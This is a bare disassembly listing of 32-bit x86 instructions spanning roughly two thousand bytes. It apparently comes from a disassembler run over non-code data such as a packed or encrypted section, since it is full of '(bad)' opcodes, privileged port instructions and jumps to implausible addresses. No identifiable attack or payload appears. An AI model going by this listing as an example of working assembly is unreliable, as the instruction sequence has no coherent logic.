  4193d8:	adc    ch,0x9
  4193db:	mov    ds:0xe6d032df,al
  4193e0:	jle    0x419416
  4193e2:	jae    0x41945b
  4193e4:	sub    ch,cl
  4193e6:	outs   dx,BYTE PTR ds:[esi]
  4193e7:	popa   
  4193e8:	(bad)  [eax+0x3b190b6]
  4193ee:	add    cl,ah
  4193f0:	mov    esi,0xcc995d1f
  4193f5:	xor    eax,0xceb1d2da
  4193fa:	ret    
  4193fb:	inc    esi
  4193fc:	fwait
  4193fd:	sub    al,0xf1
  4193ff:	or     ebp,DWORD PTR [ebx-0x38]
  419402:	push   es
  419403:	cmp    ch,dh
  419405:	dec    ebx
  419406:	xor    BYTE PTR [esi],dl
  419408:	mov    dl,BYTE PTR [edi]
  41940a:	sti    
  41940b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41940c:	push   edx
  41940d:	xchg   BYTE PTR [eax-0x4021a599],bh
  419413:	jmp    0x4193d8
  419415:	imul   esi,edx,0x64
  419418:	jb     0x419431
  41941a:	push   0x37302781
  41941f:	add    eax,0x8e436f
  419424:	push   ebx
  419425:	xchg   ebx,eax
  419426:	les    edx,FWORD PTR [edi-0x5e]
  419429:	mov    edx,0x57dcd4f8
  41942e:	stos   BYTE PTR es:[edi],al
  41942f:	inc    edx
  419430:	loop   0x41942e
  419432:	daa    
  419433:	stc    
  419434:	jne    0x419416
  419436:	or     bl,dh
  419438:	in     eax,dx
  419439:	push   cs
  41943a:	out    dx,eax
  41943b:	(bad)  
  41943d:	xchg   ebx,eax
  41943e:	(bad)  
  41943f:	jae    0x419418
  419441:	sub    DWORD PTR [edi+0x32],ebx
  419444:	retf   
  419445:	adc    bl,al
  419447:	xor    al,0xec
  419449:	out    0x3e,eax
  41944b:	into   
  41944c:	cld    
  41944d:	repz push esp
  41944f:	or     al,dh
  419451:	xor    al,0xb3
  419453:	dec    esp
  419454:	jp     0x4193fc
  419456:	pop    ebx
  419457:	stos   BYTE PTR es:[edi],al
  419458:	idiv   BYTE PTR [esi+0x30d65bc5]
  41945e:	(bad)  
  41945f:	das    
  419460:	nop
  419461:	and    DWORD PTR [ebp-0x7dd3cdea],ecx
  419467:	inc    esi
  419468:	iret   
  419469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41946a:	mov    ah,0x8b
  41946c:	fwait
  41946d:	jle    0x419456
  41946f:	pop    ebx
  419470:	mov    cl,BYTE PTR [ecx+0xbe9af6a]
  419476:	inc    ecx
  419477:	jge    0x419450
  419479:	or     ebp,DWORD PTR [ebx]
  41947b:	inc    BYTE PTR [edx-0x5b]
  41947e:	or     DWORD PTR [edi+0x1b22c5e2],esi
  419484:	lds    ebx,FWORD PTR [edi-0x5c]
  419487:	out    0x58,al
  419489:	or     BYTE PTR [ebp+eiz*4+0x59],dh
  41948d:	xchg   edi,eax
  41948e:	lods   al,BYTE PTR ds:[esi]
  41948f:	mov    bh,0xea
  419491:	xchg   ebp,eax
  419492:	fld    TBYTE PTR [edi-0x69]
  419495:	add    eax,0xd3483980
  41949a:	in     eax,dx
  41949b:	cmp    ebp,DWORD PTR [edx+0x6d]
  41949e:	sub    eax,0x3a497e75
  4194a3:	outs   dx,DWORD PTR ds:[esi]
  4194a4:	adc    bh,BYTE PTR [edx-0x25]
  4194a7:	or     eax,0xb45ddaa1
  4194ac:	sub    bh,BYTE PTR [esi-0x68]
  4194af:	adc    BYTE PTR [edx-0x3],ch
  4194b2:	scas   eax,DWORD PTR es:[edi]
  4194b3:	call   0x9f3d58ee
  4194b8:	inc    ecx
  4194b9:	fimul  WORD PTR [ebx-0x1d]
  4194bc:	mov    edi,DWORD PTR [eax-0x2e]
  4194bf:	inc    edi
  4194c0:	inc    esp
  4194c1:	dec    ebp
  4194c2:	popf   
  4194c3:	lea    ax,[ecx-0x53dec2c5]
  4194ca:	outs   dx,BYTE PTR ds:[esi]
  4194cb:	rol    bh,1
  4194cd:	mov    ebp,0x905f2b8
  4194d2:	pop    ds
  4194d3:	and    al,0xa8
  4194d5:	outs   dx,DWORD PTR ds:[esi]
  4194d6:	rcr    DWORD PTR [edi-0x69],cl
  4194d9:	lock inc ecx
  4194db:	cmc    
  4194dc:	daa    
  4194dd:	mul    BYTE PTR [ebx]
  4194df:	mov    ecx,0xc64d30cb
  4194e4:	mov    al,0x29
  4194e6:	mov    ebx,DWORD PTR [esi+0x69a73a7]
  4194ec:	pop    eax
  4194ed:	icebp  
  4194ee:	xor    ecx,DWORD PTR [ebp-0x777d8226]
  4194f4:	test   ecx,eax
  4194f6:	push   edi
  4194f7:	addr16 aaa 
  4194f9:	repnz and BYTE PTR [esi+0x39],0xdf
  4194fe:	inc    edi
  4194ff:	inc    ebx
  419500:	and    al,0xf
  419502:	inc    esp
  419503:	rcr    BYTE PTR [esi+0x2],cl
  419506:	and    al,0xe9
  419508:	cmp    ch,BYTE PTR [edx+0xc6cfbba]
  41950e:	push   ebp
  41950f:	push   ds
  419510:	(bad)  
  419511:	jp     0x4194bb
  419513:	in     al,dx
  419514:	dec    eax
  419515:	repnz scas al,BYTE PTR es:[edi]
  419517:	in     al,0x78
  419519:	mov    edx,0x4aa95f29
  41951e:	sbb    ah,BYTE PTR [edi]
  419520:	add    edx,ebp
  419522:	mov    cl,al
  419524:	aad    0xed
  419526:	stos   DWORD PTR es:[edi],eax
  419527:	jge    0x41958b
  419529:	cmc    
  41952a:	or     DWORD PTR [esi],esi
  41952c:	mov    DWORD PTR [edi-0x3e],ebp
  41952f:	aas    
  419530:	inc    esi
  419531:	rcr    ebx,0x1c
  419534:	fidiv  DWORD PTR [ebp+0x7a]
  419537:	jbe    0x4194f4
  419539:	jo     0x41957f
  41953b:	sbb    edx,ecx
  41953d:	scas   eax,DWORD PTR es:[edi]
  41953e:	fidiv  WORD PTR [edi+0x68da5ab1]
  419544:	ins    DWORD PTR es:[edi],dx
  419545:	jnp    0x419569
  419547:	lahf   
  419548:	ss and eax,0x9eacae11
  41954e:	push   edx
  41954f:	jne    0x419510
  419551:	mov    ch,0x35
  419553:	adc    al,0xc1
  419555:	rcl    BYTE PTR [ebx+0x4a],1
  419558:	icebp  
  419559:	pushf  
  41955a:	fdivrp st(3),st
  41955c:	jecxz  0x4195c1
  41955e:	dec    edi
  41955f:	jmp    0x4195ce
  419561:	dec    edi
  419562:	jae    0x4195c1
  419564:	xor    al,0x2e
  419566:	cli    
  419567:	cs shl ebx,cl
  41956a:	add    DWORD PTR [ebx+0xf923de8],ecx
  419570:	mov    ecx,0x442bbeb3
  419575:	push   ss
  419576:	pop    ecx
  419577:	popf   
  419578:	in     al,dx
  419579:	sub    ah,BYTE PTR [ebp+0x1e]
  41957c:	leave  
  41957d:	add    eax,0xf0fbc1ee
  419582:	fdivr  QWORD PTR [edx]
  419584:	scas   al,BYTE PTR es:[edi]
  419585:	out    0xb9,al
  419587:	sbb    ch,0x79
  41958a:	adc    BYTE PTR [ebx-0x114c5c11],0x3b
  419591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419592:	pop    esp
  419593:	outs   dx,DWORD PTR ds:[esi]
  419594:	pushf  
  419595:	mov    bh,0x21
  419597:	ins    DWORD PTR es:[edi],dx
  419598:	scas   al,BYTE PTR es:[edi]
  419599:	test   BYTE PTR [esi+0x75c07eaf],cl
  41959f:	(bad)  
  4195a0:	adc    DWORD PTR [ecx-0x62b6246e],esi
  4195a6:	out    dx,al
  4195a7:	stos   BYTE PTR es:[edi],al
  4195a8:	mov    ds:0x53913542,al
  4195ad:	push   eax
  4195ae:	xchg   edi,eax
  4195af:	test   DWORD PTR [ebx-0x5c],0x55d7be74
  4195b6:	(bad)  
  4195b8:	mov    ebp,0x845e0518
  4195bd:	cmc    
  4195be:	pop    ebp
  4195bf:	test   al,0x19
  4195c1:	dec    esi
  4195c2:	mov    dh,0x94
  4195c4:	sbb    BYTE PTR [esi-0x3d95517a],cl
  4195ca:	or     eax,0xae7610dd
  4195cf:	(bad)  
  4195d0:	and    eax,0x72169c44
  4195d5:	(bad)  
  4195d6:	pop    eax
  4195d7:	ror    DWORD PTR [ecx+0x6b],0x67
  4195db:	retf   
  4195dc:	dec    edx
  4195dd:	xchg   ebp,eax
  4195de:	sub    BYTE PTR [eax],dh
  4195e0:	cmp    DWORD PTR [ebp+0x31],eax
  4195e3:	mov    al,0xaa
  4195e5:	jmp    0x9309:0x311eb48b
  4195ec:	out    0x2a,eax
  4195ee:	inc    ecx
  4195ef:	int    0xfe
  4195f1:	sbb    dl,BYTE PTR [edi+0x4e]
  4195f4:	xchg   bl,bl
  4195f6:	and    ah,0x52
  4195f9:	xor    BYTE PTR [ebx],dh
  4195fb:	sub    BYTE PTR [eax+0x3149fd45],cl
  419601:	jmp    0x419648
  419603:	das    
  419604:	loope  0x419618
  419606:	dec    ebx
  419607:	sti    
  419608:	xchg   BYTE PTR [eax],dh
  41960a:	in     eax,0x72
  41960c:	pop    edi
  41960d:	scas   al,BYTE PTR es:[edi]
  41960e:	xchg   esp,eax
  41960f:	(bad)  [eax+ecx*4+0x11c49931]
  419616:	xchg   esi,eax
  419617:	mov    ds:0x4d6dd573,eax
  41961c:	mov    esi,0x5d87cd2
  419621:	cmp    BYTE PTR [ecx+edx*8-0x7dd51ee5],ch
  419628:	fimul  WORD PTR [eax]
  41962a:	pop    es
  41962b:	ins    BYTE PTR es:[edi],dx
  41962c:	adc    ch,BYTE PTR [ebp+0x27d9ce4]
  419632:	xchg   esp,eax
  419633:	add    DWORD PTR [ebp+0x5],0xa01d7a63
  41963a:	fwait
  41963b:	test   BYTE PTR [ebx-0x2],dl
  41963e:	cmp    bl,BYTE PTR [edx]
  419640:	jae    0x4196bb
  419642:	pop    eax
  419643:	mov    edi,esi
  419645:	xchg   ebp,eax
  419646:	dec    edx
  419647:	test   al,0x37
  419649:	jl     0x419613
  41964b:	and    eax,0x9b9ba802
  419650:	fld    DWORD PTR [esi]
  419652:	xor    DWORD PTR [esi+0x1b],0x49
  419656:	pushw  es
  419658:	jmp    0x5044bf3c
  41965d:	jmp    0x3522:0x39f1d7ed
  419664:	rcl    BYTE PTR [ebx],cl
  419666:	imul   esi,DWORD PTR [edi-0x61],0x20
  41966a:	mov    DWORD PTR [ebx-0x149d66a5],eax
  419670:	jl     0xff755797
  419676:	enter  0x927,0xe
  41967a:	inc    ebp
  41967b:	cld    
  41967c:	out    dx,al
  41967d:	mov    ebx,0xea5a7605
  419682:	loopne 0x41969a
  419684:	repnz xor eax,0x3e3d979e
  41968a:	pushf  
  41968b:	sahf   
  41968c:	cmp    eax,0xdabc2278
  419691:	test   al,0x7a
  419693:	xor    ebp,DWORD PTR [ebx-0x56cc84e0]
  419699:	and    eax,0x118a0c3b
  41969e:	dec    edi
  41969f:	xchg   DWORD PTR [ecx+0x22c7d901],edx
  4196a5:	push   edx
  4196a6:	fs dec edx
  4196a8:	dec    ebx
  4196a9:	push   esp
  4196aa:	cmp    DWORD PTR [eax-0x5d],ebx
  4196ad:	mov    DWORD PTR [esi+0x3c],edi
  4196b0:	or     BYTE PTR [ecx+0x5c19869b],ch
  4196b6:	test   eax,ebp
  4196b8:	xchg   esi,eax
  4196b9:	or     edi,ebp
  4196bb:	iret   
  4196bc:	jno    0x419717
  4196be:	dec    edx
  4196bf:	push   ecx
  4196c0:	sub    DWORD PTR [ecx+0x26],esi
  4196c3:	mov    ecx,cs
  4196c5:	jo     0x419725
  4196c7:	xor    DWORD PTR [ebx-0x6af6a172],esp
  4196cd:	and    al,0x30
  4196cf:	dec    esi
  4196d0:	cwde   
  4196d1:	js     0x41965a
  4196d3:	push   0xb7b6b627
  4196d8:	mov    ch,0x68
  4196da:	adc    DWORD PTR ds:0x10c1a498,ebp
  4196e0:	test   DWORD PTR [edi+0x55066b3],esp
  4196e6:	(bad)  
  4196e7:	mov    eax,ds:0x2113dd4c
  4196ec:	(bad)  
  4196ed:	scas   al,BYTE PTR es:[edi]
  4196ee:	es int 0x1c
  4196f1:	sub    al,0xee
  4196f3:	(bad)  
  4196f4:	jnp    0x41967a
  4196f6:	imul   ebp,DWORD PTR [ebp+0x3aaa1181],0xffffffe3
  4196fd:	mov    al,0x11
  4196ff:	mov    BYTE PTR [eax+ecx*8+0x10dc99db],ch
  419706:	inc    ecx
  419707:	sbb    eax,0xaa2c0fdf
  41970c:	inc    ecx
  41970d:	nop
  41970e:	or     BYTE PTR ds:0x5c6a9811,bh
  419714:	rcr    ah,1
  419716:	lea    edx,[ebp-0x76f89f20]
  41971c:	pop    esp
  41971d:	add    bh,BYTE PTR [edi-0x4a]
  419720:	jecxz  0x41979f
  419722:	and    bh,BYTE PTR ds:0xf324918e
  419728:	arpl   WORD PTR [edx-0xcade8da],bp
  41972e:	(bad)  
  41972f:	icebp  
  419730:	dec    esp
  419731:	aas    
  419732:	mov    dh,0x95
  419734:	xor    ah,BYTE PTR [ebx-0x46]
  419737:	xchg   BYTE PTR [ebx+esi*4+0x20fe15fc],bh
  41973e:	add    ebx,DWORD PTR [edi+0x8]
  419741:	dec    esp
  419742:	push   esi
  419743:	ins    DWORD PTR es:[edi],dx
  419744:	jno    0x41974d
  419746:	pushf  
  419747:	pop    es
  419748:	mov    bl,0xf2
  41974a:	inc    ebp
  41974b:	mov    ebp,0x25110cfd
  419750:	mov    fs,WORD PTR [si]
  419753:	add    DWORD PTR [eax-0x58],ecx
  419756:	retf   0x20e7
  419759:	pop    edi
  41975a:	push   edi
  41975b:	aas    
  41975c:	shl    DWORD PTR [esi],1
  41975e:	jge    0x419773
  419760:	add    DWORD PTR [ebx+0x2b7e4137],ebx
  419766:	xchg   edx,eax
  419767:	mov    esp,0x7d8c597a
  41976c:	or     cl,BYTE PTR [esi-0x30]
  41976f:	and    al,0x6
  419771:	lods   al,BYTE PTR ds:[esi]
  419772:	fisttp QWORD PTR [edi]
  419774:	or     edi,esp
  419776:	pop    ebx
  419777:	jge    0x419739
  419779:	cwde   
  41977a:	push   esi
  41977b:	stos   DWORD PTR es:[edi],eax
  41977c:	pop    edx
  41977d:	xchg   ebp,eax
  41977e:	and    eax,0x70eafc8e
  419783:	xchg   DWORD PTR ds:0xe960656e,edi
  419789:	sbb    DWORD PTR cs:[eax-0x25],esi
  41978d:	out    0xd4,eax
  41978f:	loop   0x4197a7
  419791:	mov    dl,0x9a
  419793:	push   ecx
  419794:	mov    DWORD PTR [ebx+0x4ec54962],eax
  41979a:	out    dx,eax
  41979b:	repnz aas 
  41979d:	or     BYTE PTR [edi+0x1fc018d3],dh
  4197a3:	mov    ebx,0xe1e85f01
  4197a8:	les    edi,FWORD PTR [edi]
  4197aa:	xchg   edx,eax
  4197ab:	fstp   DWORD PTR [ecx]
  4197ad:	icebp  
  4197ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197af:	cmp    eax,0x1d6f0048
  4197b4:	bnd jae 0x41973c
  4197b7:	add    al,0xc1
  4197b9:	pop    eax
  4197ba:	mov    eax,ds:0x657273ea
  4197bf:	xchg   BYTE PTR [ebx+0x18890683],dh
  4197c5:	aaa    
  4197c6:	inc    esi
  4197c7:	push   eax
  4197c8:	into   
  4197c9:	out    dx,al
  4197ca:	rcl    DWORD PTR [edx+ebp*4+0x2b],0x91
  4197cf:	push   ecx
  4197d0:	sti    
  4197d1:	pushf  
  4197d2:	xchg   BYTE PTR [eax-0x58],cl
  4197d5:	pop    esp
  4197d6:	std    
  4197d7:	aad    0x2e
  4197d9:	mov    eax,ds:0x591bdffa
  4197de:	or     al,0x93
  4197e0:	or     bl,BYTE PTR [esi+0x57]
  4197e3:	push   ss
  4197e4:	int3   
  4197e5:	pop    ss
  4197e6:	cdq    
  4197e7:	les    ecx,FWORD PTR [edi+edx*4+0x68]
  4197eb:	dec    edi
  4197ec:	mov    edi,0x5d2c399e
  4197f1:	call   0xb9bb:0xc0caccd1
  4197f8:	data16 shl BYTE PTR [edx-0x7],1
  4197fc:	stc    
  4197fd:	mov    ah,0x4
  4197ff:	push   ecx
  419800:	imul   BYTE PTR [ebx-0x6e]
  419803:	cli    
  419804:	sbb    dh,dh
  419806:	cmp    esp,ecx
  419808:	mov    eax,0x85c2d5e1
  41980d:	xchg   DWORD PTR [edi-0x73ca0745],eax
  419813:	add    BYTE PTR [ebx-0x326d15ca],dl
  419819:	es or  eax,0x1820f215
  41981f:	push   ds
  419820:	adc    edx,DWORD PTR [edx]
  419822:	pop    ss
  419823:	int3   
  419824:	mov    WORD PTR [edi],ds
  419826:	lahf   
  419827:	mov    cs,WORD PTR [edx+0x7ac9c2fc]
  41982d:	mov    ecx,0xafec564d
  419832:	mov    dl,0x70
  419834:	inc    esp
  419835:	scas   eax,DWORD PTR es:[edi]
  419836:	cmp    DWORD PTR [edx],eax
  419838:	xchg   ebx,eax
  419839:	outs   dx,DWORD PTR ds:[esi]
  41983a:	fs fcmovnu st,st(3)
  41983d:	jmp    0x41981a
  41983f:	mov    edi,0x634484bf
  419844:	ja     0x4197cb
  419846:	sub    BYTE PTR [ebp-0x48],bl
  419849:	pop    eax
  41984a:	fwait
  41984b:	mov    ecx,0x4e8abab7
  419850:	mov    ecx,0x3504ea1
  419855:	cmp    al,0x99
  419857:	cmp    al,0x1
  419859:	mov    eax,DWORD PTR [edx+0x16]
  41985c:	ja     0x4197e5
  41985e:	(bad)  
  41985f:	cmc    
  419860:	fist   DWORD PTR [edi+0x66]
  419863:	inc    BYTE PTR [edx-0xe]
  419866:	sbb    BYTE PTR [edx],al
  419868:	and    DWORD PTR [eax+0x123878d1],edi
  41986e:	hlt    
  41986f:	jmp    0x419842
  419871:	adc    DWORD PTR [edi+0x6f],ecx
  419874:	stc    
  419875:	mov    ebp,0x53205135
  41987a:	jge    0x4198b1
  41987c:	(bad)  
  41987d:	lahf   
  41987e:	ja     0x4198a1
  419880:	js     0x4198b6
  419882:	pop    ecx
  419883:	mov    esi,0xbc6b1689
  419888:	xchg   ecx,eax
  419889:	ja     0x419863
  41988b:	mov    ds:0xed2d2593,eax
  419890:	push   edx
  419891:	iret   
  419892:	add    eax,0xd46cf2a6
  419897:	xchg   edx,eax
  419898:	cmp    edi,DWORD PTR [esi+0x66]
  41989b:	sti    
  41989c:	sub    ecx,DWORD PTR [ebp+0x163fd5ba]
  4198a2:	jmp    FWORD PTR [edi-0x5fdac749]
  4198a8:	jle    0x419869
  4198aa:	pushf  
  4198ab:	clc    
  4198ac:	cwde   
  4198ad:	and    eax,0xf4cafa9a
  4198b2:	call   0xa668:0x46f84f0f
  4198b9:	and    eax,0xf1d02e3c
  4198be:	icebp  
  4198bf:	cdq    
  4198c0:	sbb    bl,bh
  4198c2:	fsqrt  
  4198c4:	test   eax,0xbfc1a0c3
  4198c9:	mov    ecx,0xfe399b80
  4198ce:	rcr    DWORD PTR [edx],1
  4198d0:	fidivr DWORD PTR [esi+0x5]
  4198d3:	push   esp
  4198d4:	gs (bad) 
  4198d6:	mov    esi,0x8190aacb
  4198db:	xchg   esi,edx
  4198dd:	mov    ds:0xd6dfad61,eax
  4198e2:	and    bh,dl
  4198e4:	loope  0x4198d4
  4198e6:	outs   dx,BYTE PTR ds:[esi]
  4198e7:	aam    0xe4
  4198e9:	dec    ebx
  4198ea:	xchg   ecx,eax
  4198eb:	xsha256 (bad)
  4198ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198ed:	adc    eax,0x45ee551e
  4198f2:	repz sub DWORD PTR [ecx+0x13],0x8542462a
  4198fa:	das    
  4198fb:	pop    edi
  4198fc:	inc    ecx
  4198fd:	or     bl,cl
  4198ff:	das    
  419900:	sub    DWORD PTR [esi],0x41
  419903:	pop    ss
  419904:	dec    ebp
  419905:	or     eax,0x27393ed2
  41990a:	fbld   TBYTE PTR [edx+0x13]
  41990d:	(bad)  
  41990e:	mov    edi,0xab2ce089
  419913:	jo     0x419895
  419915:	adc    eax,0x66b98a46
  41991a:	jne    0x4198e3
  41991c:	pop    ecx
  41991d:	pop    edi
  41991e:	push   ds
  41991f:	test   esi,0x492d1330
  419925:	xchg   ebx,eax
  419926:	or     BYTE PTR [ecx+ebp*4],al
  419929:	fmul   st(3),st
  41992b:	data16 mov ah,0x11
  41992e:	add    esi,ebx
  419930:	mov    ch,0xb7
  419932:	test   al,0xff
  419934:	xor    BYTE PTR [edi-0x315727d9],0x92
  41993b:	dec    edi
  41993c:	xchg   edx,eax
  41993d:	in     al,dx
  41993e:	fst    QWORD PTR [eax+esi*8-0x45]
  419942:	mov    DWORD PTR [ebx],eax
  419944:	xor    DWORD PTR [ecx+0x3e],eax
  419947:	xchg   cl,dh
  419949:	push   es
  41994a:	sbb    dl,dh
  41994c:	jns    0x41992e
  41994e:	aas    
  41994f:	xchg   DWORD PTR [esi-0x70780331],eax
  419955:	mov    dh,0x18
  419957:	ror    DWORD PTR [ecx+eax*2-0x56b51b54],1
  41995e:	add    BYTE PTR [edx-0x27],dh
  419961:	xchg   ebx,eax
  419962:	cmp    eax,0x1bdeaaa7
  419967:	mov    al,0x84
  419969:	and    ebx,DWORD PTR [ecx+ebp*1-0x6f56830b]
  419970:	push   edi
  419971:	jle    0x41991f
  419973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419974:	fs out 0xb3,al
  419977:	add    eax,DWORD PTR [edi+0x2d]
  41997a:	mov    cl,0x67
  41997c:	in     al,0xa4
  41997e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41997f:	jae    0x4199b1
  419981:	and    DWORD PTR [esi-0x62],eax
  419984:	mov    BYTE PTR [edi-0x296d2bff],cl
  41998a:	stos   BYTE PTR es:[edi],al
  41998b:	(bad)  
  41998c:	test   eax,0x82325498
  419991:	and    al,0x52
  419993:	jp     0x419a02
  419995:	sbb    dh,BYTE PTR [ecx+0x1b]
  419998:	xchg   edi,eax
  419999:	(bad)  
  41999a:	jbe    0x4199e9
  41999c:	cmp    eax,edx
  41999e:	icebp  
  41999f:	icebp  
  4199a0:	cmp    ch,BYTE PTR [ebp-0x4fe38dd4]
  4199a6:	sahf   
  4199a7:	xor    BYTE PTR [edx],ah
  4199a9:	loopne 0x419945
  4199ab:	cli    
  4199ac:	test   eax,0x14bdd024
  4199b1:	or     eax,0xee6cbd05
  4199b6:	aad    0xdc
  4199b8:	fwait
  4199b9:	imul   ebx,DWORD PTR [eax+0x40],0xe7a35693
  4199c0:	fiadd  DWORD PTR [edi-0x7d]
  4199c3:	cli    
  4199c4:	inc    edi
  4199c5:	jg     0x419976
  4199c7:	cmp    BYTE PTR [esi+0x28],bh
  4199ca:	jge    0x4199cd
  4199cc:	mov    ebx,0x87853485
  4199d1:	dec    ecx
  4199d2:	dec    edi
  4199d3:	test   edi,edx
  4199d5:	and    DWORD PTR [ecx-0x66],0x56
  4199d9:	or     edx,DWORD PTR [esp+edi*1+0x312d5806]
  4199e0:	xor    edx,esp
  4199e2:	repz std 
  4199e4:	jle    0x419a21
  4199e6:	je     0x419a5d
  4199e8:	das    
  4199e9:	dec    eax
  4199ea:	(bad)  
  4199eb:	cs mov edx,0x23d9d229
  4199f1:	aas    
  4199f2:	fidiv  DWORD PTR [edi-0x26b94ddc]
  4199f8:	cdq    
  4199f9:	ins    BYTE PTR es:[edi],dx
  4199fa:	inc    eax
  4199fb:	retf   
  4199fc:	js     0x4199ff
  4199fe:	adc    eax,DWORD PTR [ebx]
  419a00:	gs das 
  419a02:	hlt    
  419a03:	sub    eax,DWORD PTR [eax+esi*8-0x1a]
  419a07:	mul    eax
  419a09:	or     BYTE PTR [ebx-0x10e2427e],dh
  419a0f:	add    eax,esp
  419a11:	mov    eax,ds:0xe5b210cc
  419a16:	push   0xfffffffa
  419a18:	stc    
  419a19:	xchg   ebp,eax
  419a1a:	lock nop
  419a1c:	cmp    eax,0x2a7b47b5
  419a21:	ins    DWORD PTR es:[edi],dx
  419a22:	lock shl DWORD PTR [eax+edx*1],0x6e
  419a27:	xor    BYTE PTR [ecx],ch
  419a29:	dec    ebp
  419a2a:	cli    
  419a2b:	fstp   DWORD PTR [ebx]
  419a2d:	aaa    
  419a2e:	push   ds
  419a2f:	or     al,0xd6
  419a31:	cs imul edi,edi,0x6f
  419a35:	fcomp  DWORD PTR [ecx+eiz*4]
  419a38:	inc    ebx
  419a39:	push   eax
  419a3a:	es sbb al,0xe8
  419a3d:	push   eax
  419a3e:	jg     0x4199ed
  419a40:	repz mov al,0xef
  419a43:	fidivr WORD PTR [edi+0x72]
  419a46:	dec    edi
  419a47:	aam    0xc2
  419a49:	dec    ebp
  419a4a:	xchg   esp,edx
  419a4c:	jns    0x4199e4
  419a4e:	mov    cl,0xda
  419a50:	aad    0x44
  419a52:	in     al,dx
  419a53:	mov    edx,DWORD PTR [ecx+eiz*4-0x19197478]
  419a5a:	std    
  419a5b:	add    al,0xb5
  419a5d:	icebp  
  419a5e:	sub    eax,0xdb2fbe31
  419a63:	pushf  
  419a64:	outs   dx,DWORD PTR ds:[esi]
  419a65:	scas   eax,DWORD PTR es:[edi]
  419a66:	jb     0x419a30
  419a68:	shl    DWORD PTR es:[esi],1
  419a6b:	xchg   edx,eax
  419a6c:	and    al,0x1a
  419a6e:	cmp    eax,0x75a46d9e
  419a73:	bnd ja 0x419a7b
  419a76:	cmp    al,0x5e
  419a78:	push   es
  419a79:	not    BYTE PTR [ecx+0x11301f36]
  419a7f:	out    dx,al
  419a80:	scas   al,BYTE PTR es:[edi]
  419a81:	cdq    
  419a82:	imul   BYTE PTR [ecx+eax*4+0x75]
  419a86:	push   edx
  419a87:	repnz stc 
  419a89:	xor    eax,0xed830bc0
  419a8e:	jmp    0x419aec
  419a90:	je     0x419a9e
  419a92:	punpckhbw mm6,QWORD PTR [edx]
  419a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a96:	jbe    0x419ad1
  419a98:	jp     0x419ace
  419a9a:	sub    bh,al
  419a9c:	adc    al,0x7c
  419a9e:	pop    ss
  419a9f:	stos   BYTE PTR es:[edi],al
  419aa0:	pop    esi
  419aa1:	pop    esp
  419aa2:	or     al,bh
  419aa4:	add    DWORD PTR [ebp+0x42c2848e],0xfffffffc
  419aab:	das    
  419aac:	ffreep st(6)
  419aae:	cwde   
  419aaf:	jbe    0x419ad3
  419ab1:	out    dx,al
  419ab2:	sbb    DWORD PTR [ebx],0xe8a9ab16
  419ab8:	xor    ch,BYTE PTR [edi+ecx*8-0x61391fc3]
  419abf:	es push edi
  419ac1:	std    
  419ac2:	xor    BYTE PTR [ecx-0x2faba0c0],dl
  419ac8:	ins    DWORD PTR es:[edi],dx
  419ac9:	int    0x32
  419acb:	adc    DWORD PTR [ebx+0x6f],0x443304ff
  419ad2:	mov    eax,ds:0x91e1e730
  419ad7:	push   cs
  419ad8:	push   es
  419ad9:	fidiv  DWORD PTR [ecx+0x28]
  419adc:	pop    es
  419add:	inc    esi
  419ade:	xor    eax,0x73c44386
  419ae3:	in     eax,dx
  419ae4:	retf   0xab2a
  419ae7:	jmp    0x419ab9
  419ae9:	addr16 mov ch,0xe6
  419aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aed:	imul   esi,DWORD PTR [ebp-0x584f8214],0x7
  419af4:	ficom  DWORD PTR [eax]
  419af6:	out    0xec,eax
  419af8:	mov    esi,0xee43e33d
  419afd:	jb     0x419b43
  419aff:	mov    ebp,0xee963fdc
  419b04:	jle    0x419ae3
  419b06:	stc    
  419b07:	sbb    eax,0x4644f3ad
  419b0c:	push   ebx
  419b0d:	xchg   esi,eax
  419b0e:	test   eax,0xcfba428c
  419b13:	pop    ebp
  419b14:	bound  ecx,QWORD PTR ds:0x37e878e8
  419b1a:	inc    esp
  419b1b:	xchg   BYTE PTR [ebx+ecx*8+0x13],bl
  419b1f:	sbb    eax,0x4d4dca12
  419b24:	dec    esp
  419b25:	(bad)  
  419b26:	repnz test al,0x52
  419b29:	test   eax,0xf0ec5226
  419b2e:	push   ebx
  419b2f:	inc    esp
  419b30:	mov    ah,0x7d
  419b32:	(bad)  
  419b33:	pop    edx
  419b34:	mov    ?,WORD PTR [eax+0x30c2a0de]
  419b3a:	cmp    BYTE PTR [edi-0x4b],al
  419b3d:	mov    ebx,0x5f7c812e
  419b42:	scas   eax,DWORD PTR es:[edi]
  419b43:	sbb    BYTE PTR [eax+0x3defe266],0x50
  419b4a:	mov    dl,0x20
  419b4c:	dec    esi
  419b4d:	sbb    ebx,DWORD PTR [eax-0x6e]
  419b50:	addr16 cwde 
  419b52:	and    DWORD PTR [edi-0x633e1aa8],esi
  419b58:	enter  0x43e1,0x17
  419b5c:	or     eax,0x26fd2556
  419b61:	xchg   edi,eax
  419b62:	xchg   edx,eax
  419b63:	mov    ah,0xe0
  419b65:	pop    ebp
  419b66:	sub    BYTE PTR [ebx-0x40],ah
  419b69:	jmp    0x5c638d97
  419b6e:	push   edi
  419b6f:	pop    ecx
  419b70:	repnz rdtsc 
  419b73:	es call 0xa2f5814b
  419b79:	stc    
  419b7a:	and    DWORD PTR [ebp-0xd8fee5],eax
  419b80:	or     al,0x47
  419b82:	fidivr WORD PTR [eax-0x7100ab32]
  419b88:	push   ds
  419b89:	or     ebx,DWORD PTR [ecx+0x4c31c337]
  419b8f:	jg     0x419b8e
  419b91:	push   esp
  419b92:	jnp    0x419bdd
  419b94:	test   BYTE PTR [eax-0x8e9590b],bl
  419b9a:	clc    
  419b9b:	add    eax,DWORD PTR [ebx-0x6fe7ecbb]
  419ba1:	xor    ah,dh
  419ba3:	sti    
  419ba4:	and    BYTE PTR [ecx+0xf117270],bh
  419baa:	push   edx
  419bab:	cmc    
  419bac:	pop    ebp
  419bad:	dec    ecx
  419bae:	bound  edx,QWORD PTR [eax-0x26]
  419bb1:	mov    ebp,DWORD PTR [edx+0x249a7a0b]
